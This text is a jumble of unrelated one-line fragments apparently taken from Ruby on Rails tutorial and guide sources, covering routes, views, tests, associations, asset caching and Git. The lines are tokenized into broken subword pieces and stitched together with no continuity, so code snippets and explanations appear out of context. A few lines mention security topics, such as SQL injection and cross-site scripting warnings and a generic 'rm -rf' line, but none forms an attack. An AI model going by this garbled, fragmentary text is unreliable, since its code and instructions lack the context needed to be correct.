▁All ▁con t ri but ion s , ▁either ▁via ▁master ▁or ▁ doc rails , ▁get ▁ credit ▁in ▁[ Rails ▁ Contribut or s ]( http :// contributors ▖ rubyonrails ▖ org ) .
▁<%= ▁form _ for ▁@ article ▁do ▁| f | ▁%>
▁**` Rack :: ETag ` **
▁╼╼\ end { enumerate }╼╼ ▁% ▁subsection ▁user _ micropost _ associations ▁( end )╼╼ ▁\ subsection { Micropost ▁refinement s } ▁% ▁( fold )╼ ▁\ label { sec : ordering _ and _ dependency }╼╼
▁ { puts }) ▁a ▁string ▁consist ing ▁of ▁the ▁c ity ▁and ▁state ▁separate d ▁by ▁a ▁ com ma ▁and ▁as ▁ space , ▁as ▁in ▁`` L o s ▁An ge le s , ▁C A '' ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 76 8 a 7 4 ' ></ span >╼╼ ▁\ item ▁R epeat ▁the ▁previous ▁exercise ▁but ▁with ▁the ▁c ity ▁and ▁state ▁separate d ▁by ▁a ▁ tab ▁character ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 4 f c 6 5 ' ></ span >╼╼ ▁\ item ▁What ▁is ▁the ▁result ▁if ▁you ▁replace ▁double ▁ quot es ▁with ▁single ▁ quot es ▁in ▁the ▁previous ▁exercise ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 48 20 a 5 ' ></ span >╼ \ end { enumerate }╼╼ ▁\ subsection { Object s ▁and ▁message ▁passing } ▁% ▁( fold )╼ ▁\ label { sec : objects _ and _ message _ passing }╼╼
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation } .
▁The ▁\ text tt { ||= } ▁( ` ` or ▁equal s '') ▁assignment ▁operator ▁is ▁a ▁common ▁Ruby ▁idiom ▁and ▁is ▁thus ▁important ▁for ▁as p ir ing ▁Rails ▁developers ▁to ▁recognize .
▁make ▁directory
▁" author _ id "▖ humanize ▁# ▁=> ▁" A u th or "
▁module ▁ Billing
▁To ▁render ▁a ▁partial ▁as ▁part ▁of ▁a ▁view , ▁you ▁use ▁the ▁` render ` ▁method ▁within ▁the ▁view :
▁This ▁standard ▁directory ▁and ▁file ▁structure ▁( Figure ~\ ref { fig : directory _ structure _ rails }) ▁is ▁one ▁of ▁the ▁many ▁advantage s ▁of ▁Rails ; ▁it ▁immediately ▁get s ▁you ▁from ▁ zero ▁to ▁a ▁functional ▁( if ▁minimal ) ▁application .
▁As ▁seen ▁in ▁Listing ~\ ref { code : name _ presence _ test }, ▁all ▁we ▁need ▁to ▁do ▁is ▁set ▁the ▁\ k ode {@ user } ▁variable ' s ▁\ k ode { name } ▁attribute ▁to ▁a ▁blank ▁string ▁( in ▁this ▁case , ▁a ▁string ▁of ▁spaces ) ▁and ▁then ▁check ▁( using ▁the ▁\ k ode { assert \_ not } ▁method ) ▁that ▁the ▁result ing ▁User ▁object ▁is ▁not ▁valid .
▁A ▁ singular ▁resource ful ▁route ▁generates ▁these ▁helpers :
▁At ▁this ▁point , ▁we ▁can ▁re seed ▁the ▁development ▁database ▁as ▁usual :
▁For ▁example , ▁suppose ▁we ▁create ▁an ▁array , ▁assign ▁a ▁second ▁variable ▁to ▁it , ▁and ▁then ▁ reverse ▁the ▁first ▁array ▁in ▁place ▁using ▁the ▁\ k ode { reverse !}
▁#### ▁text _ area _ tag
▁To p ic ▖ create ( title : ▁" ")▖ valid ?
▁A lthough ▁we ▁will ▁use ▁`` following '' ▁as ▁a ▁ label , ▁as ▁in ▁`` 50 ▁following , ▁7 5 ▁followers '' , ▁we ' ll ▁use ▁`` followed ▁users '' ▁for ▁the ▁users ▁themselves , ▁with ▁a ▁corresponding ▁\ k ode { user ▖ followed \_ users } ▁array
▁$ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / integration / users _ login _ test ▖ rb ╼ $ ▁bundle ▁exec ▁rake ▁test
▁We ▁can ▁now ▁re p r o d u ce ▁the ▁previous ▁behavior ▁of ▁\ k ode { authenticated ?}\ ▁by ▁in v o k ing ▁it ▁like ▁this :
▁What ▁happens ▁if ▁a ▁module ▁is ▁ anonymous ?
▁# ▁=> ▁[1, ▁2, ▁3]
▁< div ▁class =" field ">
▁A ▁` has _ one ` ▁association ▁also ▁set s ▁up ▁a ▁one - to - one ▁connection ▁with ▁another ▁model , ▁but ▁with ▁some what ▁different ▁ se man tic s ▁( and ▁con sequence s )▖
▁( S ince ▁ Factory ▁Girl ▁is ▁only ▁needed ▁in ▁the ▁tests , ▁we ' ve ▁put ▁it ▁in ▁the ▁\ k ode { : test } ▁group ▖)
▁uses ▁the ▁Capybara ▁function ▁\ k ode { visit } ▁to ▁simul ate ▁visit ing ▁the ▁URL ▁\ k ode { / static \_ pages / home } ▁in ▁a ▁browser , ▁while ▁the ▁line
▁as ▁show n ▁in ▁Listing ~\ ref { code : f _ error _ messages } .
▁to ▁h ide ▁all ▁images ▖ } ╼ %= ▁ lang : css ╼\ begin { code } ╼ img ▁ { ╼ ▁display : ▁ none ; ╼ }╼\ end { code }╼\ end { code listing }╼╼ ╼ ▁% ▁subsection ▁custom _ css ▁( end )╼╼ ▁\ subsection { Partial s } ▁% ▁( fold )╼ ▁\ label { sec : partial s }╼╼
▁ Writ ing ▁an ▁automate d ▁test ▁for ▁image ▁upload ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ basic _ image _ upload }) .
▁The ╼ most ▁important ▁one ▁being ▁` Cache - Control ` ▁which ▁tell s ▁the ▁CDN ▁( and ▁web ▁browsers )╼ how ▁to ▁cache ▁contents ▖
▁#### # ▁`: dependent `
▁\ emph { I } ▁don ' t ▁know ▁what ▁they ▁all ▁do , ▁and ▁I ' ve ▁been ▁programming ▁in ▁Ruby ▁on ▁Rails ▁since ▁200 5 .
▁This ▁lead s ▁us ▁to ▁as k ▁two ▁ questions : ▁When ▁a ▁user ▁follows ▁another ▁user , ▁what ▁is ▁being ▁created ?
▁#### ▁Running ▁a ▁S ing le ▁ Test
▁\ href { https :// www ▖ code school ▖ com /}{ Code ▁School } : ▁G ood ▁inter active ▁online ▁programming ▁course s
▁The ▁` content _ for ` ▁method ▁is ▁very ▁helpful ▁when ▁your ▁layout ▁contains ▁ distinct ▁re g ion s ▁such ▁as ▁ sidebar s ▁and ▁ footer s ▁that ▁should ▁get ▁their ▁own ▁blocks ▁of ▁content ▁inserted ▖
▁As ▁indicate d ▁in ▁Listing ~\ ref { code : cat _ public _ key }, ▁users ▁of ▁the ▁cloud ▁IDE ▁can ▁view ▁their ▁public ▁key ▁using ▁the ▁\ k ode { cat } ▁command , ▁which ▁can ▁then ▁be ▁select ed ▁and ▁copie d .
▁S ince ▁email ▁addresses ▁are ▁case - insensitive ▁( Section ~\ ref { sec : format _ validation }) ▁but ▁M D 5 ▁hashes ▁are ▁not , ▁we ' ve ▁used ▁the ▁\ k ode { downcase } ▁method ▁to ▁ensure ▁that ▁the ▁argument ▁to ▁\ k ode { hexdigest } ▁is ▁all ▁lower - case .
▁Call ▁the ▁scope ▁as ▁if ▁it ▁were ▁a ▁class ▁method :
▁Note ▁the ▁use ▁of ▁the ▁\ k ode { raw } ▁method ▁to ▁prevent ▁Rails ▁from ▁es c a p ing ▁the ▁result ing ▁HTML , ▁together ▁with ▁the ▁\ k ode { sanitize } ▁method ▁needed ▁to ▁prevent ▁ cross - site ▁ script ing .
▁After ▁updating ▁the ▁Rails ▁version ╼ in ▁the ▁Gemfile , ▁run ▁this ▁rake ▁task .
▁<%= ▁stylesheet _ link _ tag ▁" application " ▁%>
▁Here ▁Rails ▁automatically ▁insert s ▁the ▁value ▁of ▁\ k ode { about \_ path } ▁in ▁place ▁of ▁the ▁question ▁mark ▁( es c a p ing ▁any ▁special ▁characters ▁if ▁necessary ), ▁there by ▁check ing ▁for ▁an ▁HTML ▁tag ▁of ▁the ▁form
▁I ▁shall ▁be ▁late ▖▖▖"
▁For ▁example , ▁if ▁the ▁\ k ode { create } ▁action ▁defines ▁an ▁\ k ode {@ user } ▁variable , ▁we ▁can ▁access ▁it ▁in ▁the ▁test ▁using ▁\ k ode { assigns (: user )} .
▁xml ▖ link (@ person ▖ fi rm ▖ account ▖ url ▁+ ▁@ recent _ items ▖ url ( item ) )
▁* ▁` find _ or _ initialize _ by _▖▖▖` ▁becomes ▁` find _ or _ initialize _ by (▖▖▖) ` .
▁def ▁file _ s ha ( path )
▁ Partial ▁templates ▁- ▁usually ▁just ▁called ▁" partial s " ▁- ▁are ▁another ▁ dev ice ▁for ▁break ing ▁the ▁rendering ▁process ▁into ▁more ▁manage able ▁ ch un k s ▖
▁#### ▁stylesheet _ url
▁The ▁actions ▁in ▁Listing ~\ ref { code : following _ followers _ action s } ▁render ▁the ▁view ▁from ▁Listing ~\ ref { code : show _ follow _ view } ▁in ▁two ▁context s , ▁`` following '' ▁and ▁`` followers '' , ▁with ▁the ▁results ▁show n ▁in ▁Figure ~\ ref { fig : user _ following } ▁and ▁Figure ~\ ref { fig : user _ followers } .
▁See ▁the ▁\ href { http :// dev center ▖ heroku ▖ com /}{ Heroku ▁documentation } ▁for ▁more ▁information ▁about ▁custom ▁domain s ▁and ▁other ▁Heroku ▁topic s .
▁* ▁` ( association _ name ) _ type ` ▁- ▁ Store s ▁the ▁type ▁for ╼ ▁[ polymorphic ▁associations ]( association _ basic s ▖ html # polymorphic - associations ) .
▁edit _ article ▁GET ▁ / articles / : id / edit (▖ : format ) ▁articles # edit
▁Here ' s ▁a ▁scenario ▁that ▁ explain s ▁why :
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁after ▁a ▁successful ▁login .
▁A g a in , ▁you ╼ create ▁a ▁file ▁` app / views / comments / _ form ▖ html ▖ erb ` ▁containing :
▁You ▁can ▁use ▁this ▁to ▁pull ▁out ▁data ▁from ▁an ▁environment ▁variable ▁or ▁to ▁perform ▁ calculations ▁to ▁generate ▁the ▁needed ▁connection ▁information .
▁c ▖ locked ▁= ▁false
▁ NoMethodError : ▁undefined ▁method ▁` empty ? '
▁This ▁validates ▁the ▁attribute ▁with ▁the ▁given ▁\ emph { regular ▁expression } ▁( or ▁\ emph { regex }), ▁which ▁is ▁a ▁powerful ▁( and ▁often ▁ crypt ic ) ▁language ▁for ▁matching ▁pattern s ▁in ▁strings .
▁### ▁In st ance ▁ V a ri able s
▁# ▁ Blog ▖ all ▖ to _ formatted _ s ▁# ▁=> ▁" First ▁P o st Second ▁P o st Third ▁P o st "
▁### ▁C a p t ure Helper
▁First , ▁the ▁engine ▁needs ▁to ▁be ▁specified ▁inside ▁the ▁application ' s ▁` Gemfile ` ▖
▁So ▁far ▁we ' ve ▁entered ▁class ▁definition s ▁at ▁the ▁console , ▁but ▁this ▁quickly ▁becomes ▁t i re some ; ▁instead , ▁create ▁the ▁file ▁\ k ode { example \_ user ▖ rb } ▁in ▁your ▁application ▁root ▁directory ▁and ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : example _ user } .
▁To ▁define ▁an ▁environment ▁called ▁" staging " ▁for ▁this ▁server , ▁just ▁create ▁a ▁file ▁called ▁` config / environments / staging ▖ rb ` ▖
▁We ' ll ▁discuss ▁them ▁further ▁in ▁Section ~\ ref { sec : professional _ grade _ deployment } ▖)
▁WARNING : ▁Buil d ing ▁your ▁own ▁conditions ▁as ▁p ure ▁strings ▁can ▁leave ▁you ▁vulnerable ▁to ▁SQL ▁injection ▁ exploit s ▖
▁As ▁long ▁as ▁you ▁re tain ▁this ▁notice ▁you ╼ ▁* ▁can ▁do ▁what ever ▁you ▁want ▁with ▁this ▁ stuff .
▁You ▁can ▁think ▁of ▁symbols ▁as ▁basic ally ▁strings ▁without ▁all ▁the ▁extra ▁b a g g age
▁The ▁result ▁in ▁the ▁case ▁of ▁the ▁debug ▁ box ▁is ▁show n ▁in ▁Figure ~\ ref { fig : home _ page _ with _ debug } .
▁We ' ve ▁seen ▁how ▁the ▁User ▁model ▁generation ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁generated ▁a ▁migration ▁file ▁( Listing ~\ ref { code : users _ migration }), ▁and ▁we ▁saw ▁in ▁Figure ~\ ref { fig : sqlite _ database _ browser } ▁the ▁results ▁of ▁running ▁this ▁migration : ▁it ▁updated ▁a ▁file ▁called ▁\ k ode { development ▖ sqlite 3 } ▁by ▁creating ▁a ▁table ▁\ k ode { users } ▁with ▁columns ▁\ k ode { id }, ▁\ k ode { name }, ▁\ k ode { email }, ▁\ k ode { created \_ at }, ▁and ▁\ k ode { updated \_ at } .
▁# ▁Defin es ▁a ▁ proto - feed .
▁( The ▁expression ▁above ▁has ▁one ▁not able ▁we a k ness : ▁it ▁allows ▁invalid ▁addresses ▁that ▁contain ▁con sec u tive ▁do t s , ▁such ▁as ▁\ k ode { foo @ bar ▖ ▖ com } .
▁Article ▖ created _ before ( Time ▖ zone ▖ now )
▁in ▁Listing ~\ ref { code : static _ page _ routes _ test } .
▁As ▁a ▁final ▁step , ▁we ' ll ▁write ▁a ▁couple ▁of ▁tests ▁to ▁double - check ▁the ▁results ▁show n ▁in ▁the ▁email ▁ preview s .
▁If ▁you ▁find ▁a ▁bug ▁report ▁without ▁a ▁test , ▁it ' s ▁very ▁useful ▁to ▁contribute ▁a ▁failing ▁test ▖
▁For ▁instance , ▁the ▁following ▁example ▁would ▁go ▁to ▁the ▁application ' s ▁` articles _ path `╼ if ▁that ▁template ▁was ▁rendered ▁from ▁the ▁application , ▁or ▁the ▁engine ' s ▁` articles _ path `╼ if ▁it ▁was ▁rendered ▁from ▁the ▁engine :
▁0 ▖ ▖ 7 ) ▁# ▁=> ▁false
▁L ess ▁emphasi s ▁on ▁features ▁specific ▁to ▁any ▁given ▁version ▁of ▁Rails , ▁with ▁ greater ▁emphasi s ▁on ▁general ▁principle s ▁of ▁web ▁development
▁as ▁seen ▁in ▁Listing ~\ ref { code : cookie _ sign _ in } .
▁The ▁method ▁` weeks _ ago ` ▁works ▁analogous ly ▁for ▁ weeks :
▁A ▁ generalized ▁\ k ode { authenticated ?}\
▁resources ▁: comments
▁ Default ▁is ▁" ▁and ▁" .
▁Here ▁is ▁some ▁sample ▁code ▁to ▁do ▁this :
▁The ▁URL ▁generated ▁will ▁have ▁the ▁full ▁path ▁to ▁your ▁CDN .
▁ Adding ▁ Asset s ▁to ▁Your ▁ Gem s
▁ mime _ type : ▁' application / x - g z ip ',
▁We ▁won ' t ▁be ▁need ing ▁CoffeeScript ▁in ▁this ▁tutorial , ▁but ▁it ' s ▁an ▁ el eg an t ▁little ▁language ▁that ▁ compile s ▁to ▁JavaScript .
▁S ince ▁we ' re ▁about ▁to ▁add ▁the ▁ability ▁to ▁create ▁new ▁users ▁through ▁the ▁web , ▁let ' s ▁remove ▁the ▁user ▁created ▁at ▁the ▁console ▁in ▁Section ~\ ref { sec : creating _ and _ authenticating _ a _ user } .
▁# ▁Co m press ▁JavaScript s ▁and ▁CSS
▁The ▁large ▁number ▁of ▁Rails ▁programmer s ▁also ▁make s ▁it ▁easier ▁to ▁handle ▁the ▁in evi table ▁application ▁errors : ▁the ▁`` Google ▁the ▁error ▁message '' ▁algorithm ▁ nearly ▁always ▁produce s ▁a ▁relevant ▁blog ▁post ▁or ▁discussion - forum ▁thread .
▁Fin ally , ▁we ' ll ▁add ▁ authorization ▁methods ▁to ▁our ▁actions ▁to ▁enforce ▁a ▁site ▁security ▁model .
▁In ▁this ▁section , ▁we ' ll ▁combine ▁Bootstrap ▁with ▁some ▁custom ▁CSS ▁rules ▁to ▁start ▁adding ▁some ▁style ▁to ▁the ▁sample ▁application .
▁The ▁solution ▁is ▁to ▁use ▁a ▁\ emph { hidden ▁field } ▁to ▁place ▁( but ▁not ▁display ) ▁the ▁email ▁on ▁the ▁page , ▁and ▁then ▁submit ▁it ▁along ▁with ▁the ▁rest ▁of ▁the ▁form ' s ▁information .
▁Tests ▁for ▁a ▁Contact ▁page .
▁In ▁the ▁ Blog ▁application , ▁you ▁will ▁now ▁create ▁a ▁new ▁ _ resource _ ▖
▁We ▁can ▁verify ▁that ▁Listing ~\ ref { code : micropost _ dependency } ▁is ▁working ▁with ▁a ▁test ▁for ▁the ▁User ▁model .
▁You ▁can ▁specify ▁a ▁full ▁path ▁relative ▁to ▁the ▁document ▁root , ▁or ▁a ▁URL ▖
▁Having ▁users ▁sign ▁in ▁will ▁also ▁allow ▁us ▁to ▁implement ▁a ▁security ▁model , ▁restrict ing ▁access ▁to ▁particular ▁pages ▁base d ▁on ▁the ▁id entity ▁of ▁the ▁signed - in ▁user .
▁The ▁result ▁of ▁adding ▁these ▁ additional ▁check s ▁appears ▁in ▁Listing ~\ ref { code : _ format _ jquery _ file _ test } .
▁Inde ed , ▁in ▁Section ~\ ref { sec : creating _ microposts } ▁we ' ll ▁use ▁a ▁text ▁\ emph { area } ▁instead ▁of ▁a ▁text ▁field ▁for ▁ submitting ▁microposts .
▁#### ▁email _ field _ tag
▁</ optgroup >
▁S ince ▁\ k ode { user \_ params } ▁will ▁only ▁be ▁used ▁internally ▁by ▁the ▁Users ▁controller ▁and ▁need ▁not ▁be ▁expose d ▁to ▁external ▁users ▁via ▁the ▁web , ▁we ' ll ▁make ▁it ▁\ emph { private } ▁using ▁Ruby ' s ▁\ k ode { private } ▁keyword , ▁as ▁show n ▁in ▁Listing ~\ ref { code : create _ action _ strong _ parameters } .
▁The ▁result ▁of ▁this ▁operation ▁is ▁an ▁array ▁of ▁three ▁strings .
▁After ▁creating ▁the ▁topic ▁branch , ▁we ' ll ▁edit ▁it ▁to ▁make ▁it ▁a ▁little ▁more ▁ de script ive .
▁There ' s ▁a ▁complement ary ▁\ k ode { unless } ▁keyword ▁that ▁works ▁the ▁same ▁way :
▁#### ▁ sanitize _ css ( style )
▁Note ▁that ▁the ▁debug ▁information ▁in ▁Figure ~\ ref { fig : user _ show _ rails } ▁confirm s ▁the ▁value ▁of ▁\ k ode { params [: id ]} :
▁#### ▁text _ field _ tag
▁The ▁initial ▁Users ▁controller , ▁with ▁a ▁\ k ode { new } ▁action .
▁The ▁cloud ▁IDE ▁also ▁includes ▁the ▁three ▁essential ▁ components ▁needed ▁to ▁develop ▁web ▁applications : ▁a ▁text ▁editor , ▁a ▁file system ▁ navigator , ▁and ▁a ▁command - line ▁terminal ▁( Figure ~\ ref { fig : ide _ an atom y }) .
▁### ▁X - Sendfile ▁Header s
▁A ▁partial ▁for ▁the ▁site ▁header .
▁By ▁default , ▁files ▁are ▁loaded ▁from ▁` public / video s ` .
▁The ▁Home ▁page ▁with ▁a ▁ proto - feed .
▁Recall ▁from ▁Section ~\ ref { sec : git _ commands } ▁that , ▁when ▁using ▁Git , ▁it ' s ▁a ▁good ▁practice ▁to ▁do ▁our ▁work ▁on ▁a ▁separate ▁topic ▁branch ▁rather ▁than ▁the ▁master ▁branch .
▁$ ▁git ▁pull ▁ JohnSmith ▁ o range
▁You ▁can ▁use ▁the ▁`: as ` ▁option ▁to ▁prefix ▁the ▁named ▁route ▁helpers ▁that ▁Rails ▁generates ▁for ▁a ▁route ▖
▁You ▁can ▁also ▁cache ▁multiple ▁JavaScript ▁files ▁into ▁one ▁file , ▁which ▁requires ▁less ▁HTTP ▁connection s ▁to ▁ download ▁and ▁can ▁better ▁be ▁ compress ed ▁by ▁g z ip ▁( le ad ing ▁to ▁faster ▁ tr an s f ers )▖
▁Add s ▁all ▁sub - d ir ec to r ies ▁of ▁` app ` ▁and ▁paths ▁specified ▁by ▁` config ▖ autoload _ paths ` ▁to ▁` ActiveSupport :: Dependencies ▖ autoload _ paths ` .
▁First ▁navigate ▁to ▁the ▁root ▁directory ▁of ▁the ▁first ▁app ▁and ▁ initialize ▁a ▁new ▁repository :
▁We ▁can ▁tell ▁the ▁difference ▁between ▁integration ▁tests ▁and ▁other ▁kind s ▁of ▁tests ▁using ▁Ruby ' s ▁convenient ▁\ k ode { defined ?}\ ▁method , ▁which ▁returns ▁true ▁if ▁its ▁argument ▁is ▁defined ▁and ▁false ▁otherwise .
▁There ▁is ▁a ▁`: scope ` ▁option ▁that ▁you ▁can ▁use ▁to ▁specify ▁other ▁attributes ▁that ╼ a re ▁used ▁to ▁ limit ▁the ▁uniqueness ▁check :
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset } .
▁ s ▁= ▁"< script > ▖▖▖ </ script > "▖ html _ safe
▁< ! - - [ if ▁ lt ▁ IE ▁ 9 ] >
▁orders ▖ find (▖▖▖)
▁The ▁way ▁to ▁get ▁the ▁failing ▁test ▁in ▁Listing ~\ ref { code : flash _ persistence _ test } ▁to ▁pass ▁is ▁to ▁replace ▁\ k ode { flash } ▁with ▁the ▁special ▁variant ▁\ k ode { flash ▖ now }, ▁which ▁is ▁specifically ▁design ed ▁for ▁display ing ▁flash ▁messages ▁on ▁rendered ▁pages .
▁Tests ▁for ▁the ▁follow ▁and ▁ unfollow ▁button s ▖
▁You ▁could ▁add ▁the ▁following ▁to ▁` app / controllers / application ▖ rb `:
▁### ▁ Updating ▁the ▁Gemfile ▖ lock
▁# ▁Defaults ▁to :
▁ rm ▁- r f ▁< directory >
▁Web ▁browsers ▁are ╼ limited ▁in ▁the ▁number ▁of ▁requests ▁that ▁they ▁can ▁make ▁in ▁parallel , ▁so ▁few er ╼ request s ▁can ▁mean ▁faster ▁loading ▁for ▁your ▁application .
▁You ▁can ▁call ▁` destroy ` ▁on ▁Active ▁Record ▁objects ▁when ▁you ▁want ▁to ▁delete ╼ the m ▁from ▁the ▁database ▖
▁instead , ▁and ▁it ▁would ▁work ▁just ▁the ▁same , ▁but ▁( as ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : layout _ exercises }) ▁the ▁convention al ▁order ▁for ▁the ▁arguments ▁to ▁\ k ode { assert \_ equal } ▁is ▁\ emph { expect ed }, ▁\ emph { actual } :
▁ Given ▁a ▁string ▁with ▁a ▁ qualified ▁constant ▁name , ▁` demodulize ` ▁returns ▁the ▁very ▁constant ▁name , ▁that ▁is , ▁the ▁right most ▁part ▁of ▁it :
▁m attr _ accessor ▁: load _ paths
▁ //= ▁require ▁m oo v in at or
▁After ▁request ▁is ▁complete , ▁f l us h es ▁all ▁the ▁log s .
▁S ince ▁ jQuery ▁is ▁the ▁default ╼ JavaScript ▁library ▁from ▁Rails ▁3▖1 ▁on ward s , ▁you ▁don ' t ▁need ▁to ▁copy ▁` jquery ▖ js `╼ in to ▁` app / assets ` ▁and ▁it ▁will ▁be ▁included ▁automatically .
▁The ▁methods ▁` beginning _ of _ week ` ▁and ▁` end _ of _ week ` ▁return ▁the ▁date s ▁for ▁the ╼ beginning ▁and ▁end ▁of ▁the ▁ week , ▁respectively ▖
▁On ce ▁these ▁CSS ▁rules ▁have ▁been ▁applied , ▁the ▁signup ▁page ▁appears ▁as ▁in ▁Figure ~\ ref { fig : signup _ form } .
▁#### ▁N a m ing ▁ Partial s
▁You ▁can ▁supply ▁a ▁path ▁to ▁the ▁ audio ▁file ▁if ▁you ▁like :
▁route ▁resources ▁: microposts
▁ { ▁nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁: x ▁=> ▁: a ▁ } ▖ transform _ value s ▁ { ▁| value | ▁value ▖ to _ s ▖ upcase ▁ }
▁# ▁ attr i b s : ▁id , ▁name , ▁con t in ent _ id
▁For ▁example
▁Here ' s ▁a ▁full ▁usage ▁example :
▁If ▁you ▁set ▁up ▁this ▁route :
▁To ▁do ▁that ,╼ bind ▁to ▁the ▁` ajax : success ` ▁even t ▖
▁To ▁avoid ▁this ▁problem , ▁we ' ll ▁use ▁a ▁\ emph { signed } ▁cookie , ▁which ▁secure ly ▁encrypt s ▁the ▁cookie ▁before ▁ placing ▁it ▁on ▁the ▁browser :
▁ Getting ▁U p ▁and ▁Running
▁$ ▁rails ▁generate ▁model ▁User ▁name : string ▁email : string
▁### ▁O p t im ist ic ▁ Lock ing
▁When ▁we ▁make ▁the ▁appropriate ▁request ▁to ▁the ▁Users ▁controller , ▁\ k ode { params [: id ]} ▁will ▁be ▁the ▁user ▁id ~\ text tt {1} , ▁so ▁the ▁effect ▁is ▁the ▁same ▁as ▁the ▁\ k ode { find } ▁method
▁With ▁this ▁foundation , ▁we ▁are ▁ready ▁for ▁a ▁more ▁ efficient ▁feed ▁implementation , ▁as ▁seen ▁in ▁Listing ~\ ref { code : feed _ final } .
▁C :: X ") ▁# ▁=> ▁true
▁=> ▁[1, ▁3 , ▁2 ]
▁At ▁this ▁point , ▁go ▁a head ▁and ▁create ▁a ▁micropost ▁or ▁two , ▁tak ing ▁care ▁to ▁make ▁sure ▁that ▁at ▁least ▁one ▁has ▁a ▁\ k ode { user \_ id } ▁of ~\ k ode {1} ▁to ▁match ▁the ▁id ▁of ▁the ▁first ▁user ▁created ▁in ▁Section ~\ ref { sec : a _ user _ tour } .
▁### ▁S eg ment ▁ Constraint s
▁A ▁user ▁with ▁updated ▁information .
▁### ▁` start s _ with ?` ▁and ▁` end s _ with ?`
▁### ▁M a in ▁F e at ure s
▁def ▁ bind ( object )
▁in ▁Listing ~\ ref { code : password _ resets _ integration _ test } .
▁ / contact
▁The ▁`: allow _ nil ` ▁option ▁skip s ▁the ▁validation ▁when ▁the ▁value ▁being ▁validate d ▁is ╼` nil ` .
▁P utting ▁all ▁the ▁elements ▁above ▁together , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁add ▁microposts ▁to ▁the ▁profile ▁page , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ microposts } .
▁Date ▖ new (201 0, ▁5 , ▁24 )▖ weeks _ ago (2) ▁# ▁=> ▁Mon , ▁10 ▁May ▁2010
▁When ▁a ▁filename ▁is ▁unique ▁and ▁base d ▁on ▁its ▁content , ▁HTTP ▁headers ▁can ▁be ▁set ▁to ╼ en c our age ▁cache s ▁every where ▁( w hether ▁at ▁CDN s , ▁at ▁ IS P s , ▁in ▁ net working ▁ equipment ,╼ or ▁in ▁web ▁browsers ) ▁to ▁keep ▁their ▁own ▁copy ▁of ▁the ▁content ▖
▁The ▁method ▁is ▁to ▁require ▁each ▁user ▁to ▁have ▁a ▁password ▁( with ▁a ▁password ▁confirmation ), ▁and ▁then ▁store ▁a ▁\ emph { hashed } ▁version ▁of ▁the ▁password ▁in ▁the ▁database .
▁array ▁= ▁[1, ▁[ 2, ▁3] ]
▁The ▁page ▁look s ▁fine , ▁though , ▁so ▁what ' s ▁the ▁problem ?
▁=> ▁[#< Micropost ▁id : ▁1, ▁content : ▁" First ▁micropost !" , ▁user _ id : ▁1, ▁ ╼ created _ at :
▁The ▁` helpers `, ▁` mailers ` ▁and ▁` models ` ▁directories ▁are ╼ empty , ▁so ▁they ▁are n ' t ▁describe d ▁in ▁this ▁section ▖
▁The ▁\ k ode { update \_ attributes } ▁method ▁accept s ▁a ▁hash ▁of ▁attributes , ▁and ▁on ▁ success ▁perform s ▁both ▁the ▁update ▁and ▁the ▁save ▁in ▁one ▁step ▁( return ing ▁\ k ode { true } ▁to ▁indicate ▁that ▁the ▁save ▁we nt ▁through ) .
▁M an if est ▁files
▁The ▁code ▁is ▁exactly ▁analogous ▁to ▁Listing ~\ ref { code : account _ activation _ preview }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ preview } .
▁Recall ▁from ▁Section ~\ ref { sec : objects _ and _ message _ passing } ▁that ▁\ k ode { ! !} \ ▁convert s ▁an ▁object ▁to ▁its ▁corresponding ▁boolean ▁value .
▁To ▁accomplish ▁this , ▁we ▁will ▁need ▁some ▁fai r ly ▁advanced ▁Rails , ▁Ruby , ▁and ▁even ▁SQL ▁programming ▁technique s .
▁The ▁code ▁in ▁Listing ~\ ref { code : user _ index _ view } ▁uses ▁the ▁result ▁of ▁Listing ~\ ref { code : gravatar _ option _ redux } ▁from ▁Section ~\ ref { sec : signup _ exercises }, ▁which ▁allows ▁us ▁to ▁pass ▁an ▁option ▁to ▁the ▁Gravatar ▁helper ▁specify ing ▁a ▁size ▁other ▁than ▁the ▁default .
▁JavaScript ▁enforce s ▁the ▁same ▁ origin ▁p ol ic y , ▁that ▁means ▁a ▁ script ▁from ▁one ▁domain ▁cannot ▁access ▁cookies ▁of ▁another ▁domain ▖
▁Here ▁we ▁have ▁access ed ▁the ▁user ' s ▁microposts ▁using ▁the ▁code ▁\ k ode { first \_ user ▖ microposts } : ▁with ▁this ▁code , ▁Active ▁Record ▁automatically ▁returns ▁all ▁the ▁microposts ▁with ▁\ k ode { user \_ id } ▁equal ▁to ▁the ▁id ▁of ▁\ k ode { first \_ user } ▁( in ▁this ▁case , ~\ k ode {1} ) .
▁ u ▖ occupation ▁= ▁" Code ▁Artist "
▁ Util ity ▁task s ▁available ▁via ▁the ▁\ k ode { rake } ▁command
▁The ▁result ▁is ▁show n ▁in ▁Figure ~\ ref { fig : home _ root _ route } .
▁The ▁sample ▁application ▁with ▁Bootstrap ▁CSS ▖ ~\ href { http :// railstutorial ▖ org / images / figures / sample _ app _ only _ bootstrap _4_0 - full ▖ png }{( full ▁size )}
▁has _ one ▁: account _ history , ▁through : ▁: account
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁full ▁HTML ▁structure ▖
▁INFO : ▁ _ CSS ▁Injection ▁is ▁actually ▁JavaScript ▁injection , ▁because ▁some ▁browsers ▁( IE , ▁some ▁versions ▁of ▁ Safari ▁and ▁other s ) ▁allow ▁JavaScript ▁in ▁CSS ▖ ▁ Thin k ▁t w ice ▁about ▁allow ing ▁custom ▁CSS ▁in ▁your ▁web ▁application .
